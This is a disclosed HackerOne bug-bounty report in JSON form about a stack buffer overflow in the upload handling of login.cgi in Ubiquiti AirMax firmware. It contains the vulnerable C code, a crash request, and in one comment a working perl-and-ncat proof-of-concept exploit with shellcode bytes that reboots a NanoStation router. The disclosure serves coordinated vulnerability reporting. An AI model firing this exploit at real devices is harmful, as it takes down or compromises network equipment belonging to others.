{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-03-08T22:00:21.616Z", 
    "voters": [
        "dyabla", 
        "pulnz"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 74025, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Yet another Buffer Overflow in PHP of the AirMax Products", 
    "is_member_of_team?": null, 
    "vote_count": 2, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-04-07T22:00:21.953Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-07-07T17:57:19.629Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-07-07T17:57:19.629Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "It remains vulnerable on v5.6.1.", 
            "markdown_message": "<p>It remains vulnerable on v5.6.1.</p>\n", 
            "type": "Activities::Comment", 
            "id": 502208, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-08-11T11:36:56.530Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-08-11T11:42:39.385Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "You didn't ask, but here is the proof-of-concept exploit:\n\nIt has created for the `NanoStation Loco M2` with the last firmware (`XM.v5.6.2.27929.150716.1201`).\n```\nperl -e 'print  \"POST /login.cgi HTTP/1.1\\r\\n\",\n                \"Host: 192.168.1.20\\r\\n\",\n                \"User-Agent: curl/7.43.0\\r\\n\",\n                \"Accept: */*\\r\\n\",\n                \"Content-Length: 836\\r\\n\",\n                \"Content-Type: multipart/form-data; boundary=------------------------98f1de9547324c34\\r\\n\",\n                \"\\r\\n\",\n                \"Z\"x524, \"JJJJ\\x2A\\xBE\\xBB\\xE4HHHHGGGGFFFFEEEEDDDDCCCCBBBB\\x2A\\xC1\\xA0\\x5C\", \n                \"Z\"x24, \"KKKKJJJJ\\x2A\\xC0\\x4F\\x18zzzz\", \n                \"Z\"x24, \"\\x2A\\xC2\\x47\\xC0zzzz\", \n                \"\\x3c\\x06\\x43\\x21\\x34\\xc6\\xfe\\xdc\\x3c\\x05\\x28\\x12\\x34\\xa5\\x19\\x69\\x3c\\x04\\xfe\\xe1\\x34\\x84\\xde\\xad\\x24\\x02\\x0f\\xf8\\x01\\x01\\x01\\x0c\", \n                \"\\r\\n\",\n                \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"upfile\\\"\\r\\n\",\n                \"Content-Type: application/octet-stream\\r\\n\",\n                \"\\r\\n\",\n                \"AnyDataHere\\r\\n\",\n                \"\\r\\n\",\n                \"--------------------------98f1de9547324c34--\\r\\n\"' | ncat --ssl 192.168.1.20 443\n```\n\nIt will reboot the router, maybe it don't work at first try and will take some seconds to reboot. All what you will need it's `perl` and `ncat` (nmap).", 
            "markdown_message": "<p>You didn&#39;t ask, but here is the proof-of-concept exploit:</p>\n\n<p>It has created for the <code>NanoStation Loco M2</code> with the last firmware (<code>XM.v5.6.2.27929.150716.1201</code>).</p>\n<pre class=\"highlight plaintext\"><code>perl -e &#39;print  &quot;POST /login.cgi HTTP/1.1\\r\\n&quot;,\n                &quot;Host: 192.168.1.20\\r\\n&quot;,\n                &quot;User-Agent: curl/7.43.0\\r\\n&quot;,\n                &quot;Accept: */*\\r\\n&quot;,\n                &quot;Content-Length: 836\\r\\n&quot;,\n                &quot;Content-Type: multipart/form-data; boundary=------------------------98f1de9547324c34\\r\\n&quot;,\n                &quot;\\r\\n&quot;,\n                &quot;Z&quot;x524, &quot;JJJJ\\x2A\\xBE\\xBB\\xE4HHHHGGGGFFFFEEEEDDDDCCCCBBBB\\x2A\\xC1\\xA0\\x5C&quot;, \n                &quot;Z&quot;x24, &quot;KKKKJJJJ\\x2A\\xC0\\x4F\\x18zzzz&quot;, \n                &quot;Z&quot;x24, &quot;\\x2A\\xC2\\x47\\xC0zzzz&quot;, \n                &quot;\\x3c\\x06\\x43\\x21\\x34\\xc6\\xfe\\xdc\\x3c\\x05\\x28\\x12\\x34\\xa5\\x19\\x69\\x3c\\x04\\xfe\\xe1\\x34\\x84\\xde\\xad\\x24\\x02\\x0f\\xf8\\x01\\x01\\x01\\x0c&quot;, \n                &quot;\\r\\n&quot;,\n                &quot;Content-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;upfile\\&quot;\\r\\n&quot;,\n                &quot;Content-Type: application/octet-stream\\r\\n&quot;,\n                &quot;\\r\\n&quot;,\n                &quot;AnyDataHere\\r\\n&quot;,\n                &quot;\\r\\n&quot;,\n                &quot;--------------------------98f1de9547324c34--\\r\\n&quot;&#39; | ncat --ssl 192.168.1.20 443\n</code></pre>\n<p>It will reboot the router, maybe it don&#39;t work at first try and will take some seconds to reboot. All what you will need it&#39;s <code>perl</code> and <code>ncat</code> (nmap).</p>\n", 
            "type": "Activities::Comment", 
            "id": 544216, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-10-09T23:52:43.059Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-09T23:52:43.059Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Hi, have been some time since this report has been uploaded (like #74004, #73491 and #73289), , and I seen in the Ubiquiti Community (airMAX Beta Blog), that you launch some php2 fixes. So I want to know if you can send me the source code of the AirMax (if not all, just the php2), so I can close some of this reports, with have been open 3 months already. \n\nBy the way, if you send me the code, I could prevent new bugs before their been implemented in the final version.", 
            "markdown_message": "<p>Hi, have been some time since this report has been uploaded (like <a href=\"/reports/74004\">#74004</a>, <a href=\"/reports/73491\">#73491</a> and <a href=\"/reports/73289\">#73289</a>), , and I seen in the Ubiquiti Community (airMAX Beta Blog), that you launch some php2 fixes. So I want to know if you can send me the source code of the AirMax (if not all, just the php2), so I can close some of this reports, with have been open 3 months already. </p>\n\n<p>By the way, if you send me the code, I could prevent new bugs before their been implemented in the final version.</p>\n", 
            "type": "Activities::Comment", 
            "id": 616222, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-10-15T11:07:30.136Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-15T11:07:30.136Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Helo? Are you still reading these reports?", 
            "markdown_message": "<p>Helo? Are you still reading these reports?</p>\n", 
            "type": "Activities::Comment", 
            "id": 621705, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-10-16T01:08:22.724Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-16T01:08:22.724Z", 
            "actor": {
                "username": "ubnt-james", 
                "url": "/ubnt-james", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Hi there,\n\nI will get you updates for your remaining reports early next week.  At least one of these has been addressed.\n\nThanks for testing!\n\nJames", 
            "markdown_message": "<p>Hi there,</p>\n\n<p>I will get you updates for your remaining reports early next week.  At least one of these has been addressed.</p>\n\n<p>Thanks for testing!</p>\n\n<p>James</p>\n", 
            "type": "Activities::Comment", 
            "id": 622464, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-10-20T15:45:32.752Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-20T15:45:32.752Z", 
            "actor": {
                "url": "/ubnt", 
                "profile": {
                    "name": "Ubiquiti Networks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
                }
            }, 
            "team_handle": "ubnt", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "93c08539", 
                "url": "/93c08539"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 626258, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "93c08539", 
                "url": "/93c08539"
            }, 
            "created_at": "2015-10-20T15:45:43.191Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-20T15:45:43.191Z", 
            "actor": {
                "username": "ubnt-james", 
                "url": "/ubnt-james", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 626260, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-08T22:00:21.641Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-08T22:00:21.641Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 829858, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-07T22:00:33.268Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-07T22:00:33.268Z", 
            "actor": {
                "url": "/ubnt", 
                "profile": {
                    "name": "Ubiquiti Networks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
                }
            }, 
            "team_handle": "ubnt", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 895016, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "93c08539", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/93c08539", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/033/613/cf19d8cc729e17c9fd3dfa2bc561766ee0c83588_small.png?1536754955"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 2, 
        "name": "Memory Corruption - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -84070510.07766321, 
    "disclosed_at": "2016-04-07T22:00:33.249Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/74025", 
    "created_at": "2015-07-05T17:04:12.735Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>It&#39;s me again!</p>\n\n<p>After the Report <a href=\"https://hackerone.com/reports/73491\">#73491</a> and the <a href=\"https://hackerone.com/reports/74004\">#74004</a>, I bring another Buffer Overflow, this one look more like <a href=\"/reports/74004\">#74004</a>, which is a overflow in stack.</p>\n\n<p>Has you can see bellow, is copied to the var <code>line</code> a content (POST data in this case) which can go beyond the content of the original variable. </p>\n<pre class=\"highlight plaintext\"><code>int ub_process_content(struct upload_buffer* ub)\n{\n    char  line[512];\n    size_t length;\n\n/** some code **/\n        if ((~ub-&gt;got) &amp; GOT_BOUNDARY) {\n            eol = (char*)memmem(ptr, size, &quot;\\r\\n&quot;, 2);\n            if (!eol) break;\n\n            length = eol - ptr + 2;\n            memcpy(line, ptr, length); //!!Problem!!//\n            line[length] = 0;\n\n    /** some code **/\n}\n</code></pre>\n<p>All what we need its a line with more than 512 bytes, example of request:</p>\n<pre class=\"highlight plaintext\"><code>POST /login.cgi HTTP/1.1\nHost: 127.0.0.1:8081\nUser-Agent: curl/7.43.0\nAccept: */*\nContent-Length: 700\nContent-Type: multipart/form-data; boundary=------------------------2ad2f036dd647428\n\n--------------------------2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\nContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;AAA&quot;\nContent-Type: application/octet-stream\n\nAAAA\n--------------------------2ad2f036dd647428--\n</code></pre>\n<p>When the var <code>ptr</code> point to the first line (of the POST content) it will have more the 512  bytes until &quot;\\r\\n&quot; and will overflow  the var <code>line</code>. As always it will cause a segmentation fault (probably because of overwriting of the return pointer), and the cgi will die with the return of the code 11, identical to the report <a href=\"/reports/74004\">#74004</a>.</p>\n\n<p>Sorry if I&#39;am Bothering you with to much reports, I will wait your reply (or one week) to send another ones. </p>\n", 
    "vulnerability_information": "It's me again!\r\n\r\nAfter the Report [#73491](https://hackerone.com/reports/73491) and the [#74004](https://hackerone.com/reports/74004), I bring another Buffer Overflow, this one look more like #74004, which is a overflow in stack.\r\n\r\nHas you can see bellow, is copied to the var `line` a content (POST data in this case) which can go beyond the content of the original variable. \r\n```\r\nint ub_process_content(struct upload_buffer* ub)\r\n{\r\n\tchar  line[512];\r\n\tsize_t length;\r\n\t\r\n/** some code **/\r\n\t\tif ((~ub->got) & GOT_BOUNDARY) {\r\n\t\t\teol = (char*)memmem(ptr, size, \"\\r\\n\", 2);\r\n\t\t\tif (!eol) break;\r\n\r\n\t\t\tlength = eol - ptr + 2;\r\n\t\t\tmemcpy(line, ptr, length); //!!Problem!!//\r\n\t\t\tline[length] = 0;\r\n\r\n\t/** some code **/\r\n}\r\n```\r\n\r\nAll what we need its a line with more than 512 bytes, example of request:\r\n```\r\nPOST /login.cgi HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nUser-Agent: curl/7.43.0\r\nAccept: */*\r\nContent-Length: 700\r\nContent-Type: multipart/form-data; boundary=------------------------2ad2f036dd647428\r\n\r\n--------------------------2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\r\nContent-Disposition: form-data; name=\"file\"; filename=\"AAA\"\r\nContent-Type: application/octet-stream\r\n\r\nAAAA\r\n--------------------------2ad2f036dd647428--\r\n```\r\n\r\nWhen the var `ptr` point to the first line (of the POST content) it will have more the 512  bytes until \"\\r\\n\" and will overflow  the var `line`. As always it will cause a segmentation fault (probably because of overwriting of the return pointer), and the cgi will die with the return of the code 11, identical to the report #74004.\r\n\r\nSorry if I'am Bothering you with to much reports, I will wait your reply (or one week) to send another ones. ", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://ubnt.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Ubiquiti Networks"
        }, 
        "handle": "ubnt", 
        "url": "https://hackerone.com/ubnt", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/800/19a040983c9b2494808c87f77337d30023b97ea7_small.png?1419364363", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 800, 
        "default_currency": "usd"
    }, 
    "is_published": false
}